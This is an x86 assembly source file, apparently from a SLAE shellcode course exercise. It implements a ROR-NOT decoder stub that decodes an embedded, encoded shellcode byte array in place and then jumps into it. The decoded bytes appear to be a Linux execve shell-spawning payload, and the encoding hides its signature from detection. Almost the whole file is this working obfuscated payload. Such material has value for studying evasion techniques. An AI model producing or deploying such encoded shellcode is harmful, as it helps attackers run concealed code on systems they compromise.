
; Shellcode Title: ROR-NOT Decoder
; Date: 20-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor eax, eax
	mul eax					; flush registers

decode:
	
	mov al, byte [esi + edx * 1]
	cmp al, 0xaa				; compare to our MARK
	je Shellcode				; execute Shellcode if MARK was found
	
	
	ror al, 2				; decoding process
	not al
	
	mov byte [esi + edx * 1], al
	
	inc edx					; next byte
	jmp short decode


call_decoder:
	call decoder
	Shellcode: db 0x3b,0xfc,0xbe,0x5e,0x43,0x43,0x32,0x5e,0x5e,0x43,0x76,0x5a,0x46,0xd9,0x70,0xbe,0xd9,0x74,0xb2,0xd9,0x78,0x3d,0xd3,0xc8,0xfd,0xaa
